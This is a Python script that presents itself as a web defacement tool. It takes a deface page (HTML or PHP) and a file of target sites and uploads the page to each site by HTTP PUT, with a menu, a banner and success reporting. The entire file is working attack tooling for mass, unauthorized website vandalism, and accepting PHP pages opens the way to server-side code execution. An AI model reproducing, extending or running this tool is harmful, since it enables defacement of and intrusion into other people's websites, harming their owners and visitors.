#!/usr/bin/env python3

import requests
import os
import sys
import argparse

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Banner
BANNER = f"""
{CYAN}

888888ba            88888888b                                     
88    `8b           88                                            
88     88 .d8888b. a88aaaa    .d8888b. .d8888b. .d8888b. 88d888b. 
88     88 88ooood8  88        88'  `88 88'  `"" 88ooood8 88'  `88 
88    .8P 88.  ...  88        88.  .88 88.  ... 88.  ... 88       
8888888P  `88888P'  dP        `88888P8 `88888P' `88888P' dP       
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
                                                                  
       {RESET}{YELLOW}Author: Nayan Das | https://github.com/nayandas69/defacer{RESET}
"""


# Function to upload deface script to target sites
def upload_deface(script_path, targets_path):
    if not os.path.isfile(script_path):
        print(f"{RED}[ERROR]{RESET} Script file '{script_path}' not found.")
        return
    if not os.path.isfile(targets_path):
        print(f"{RED}[ERROR]{RESET} Targets file '{targets_path}' not found.")
        return

    with open(script_path, "r") as f:
        script_data = f.read()

    with open(targets_path, "r") as f:
        targets = [line.strip() for line in f if line.strip()]

    session = requests.Session()
    print(f"{CYAN}[*] Uploading to {len(targets)} sites...{RESET}")

    for site in targets:
        if not site.startswith("http://") and not site.startswith("https://"):
            site = "http://" + site
        try:
            url = f"{site.rstrip('/')}/{os.path.basename(script_path)}"
            response = session.put(url, data=script_data, timeout=10)
            if 200 <= response.status_code < 300:
                print(f"{GREEN}[SUCCESS]{RESET} {url}")
            else:
                print(f"{RED}[FAILED]{RESET} {url} [{response.status_code}]")
        except requests.exceptions.RequestException as e:
            print(f"{RED}[ERROR]{RESET} {site} -> {e}")


# Main menu function to display options
def main_menu():
    print(BANNER)
    print(
        f"""{YELLOW}
[1] Start Deface
[2] Exit
{RESET}"""
    )
    choice = input(f"{CYAN}[?]{RESET} Select an option: ").strip()
    if choice == "1":
        script = input(
            f"{CYAN}[?]{RESET} Enter deface script path (.html/.php): "
        ).strip()
        targets = input(f"{CYAN}[?]{RESET} Enter targets file path (.txt): ").strip()
        upload_deface(script, targets)
    elif choice == "2":
        print(f"{YELLOW}Bye!{RESET}")
        sys.exit()
    else:
        print(f"{RED}Invalid option!{RESET}")
        main_menu()


# Main function to parse arguments and call the upload function
def parse_args():
    parser = argparse.ArgumentParser(
        description="Simple Web Defacement Tool by Nayan Das"
    )
    parser.add_argument("--script", help="Path to deface script (e.g. index.html)")
    parser.add_argument(
        "--targets", help="Path to target sites list (e.g. targets.txt)"
    )
    args = parser.parse_args()

    if args.script and args.targets:
        print(BANNER)
        upload_deface(args.script, args.targets)
    else:
        main_menu()


if __name__ == "__main__":
    parse_args()
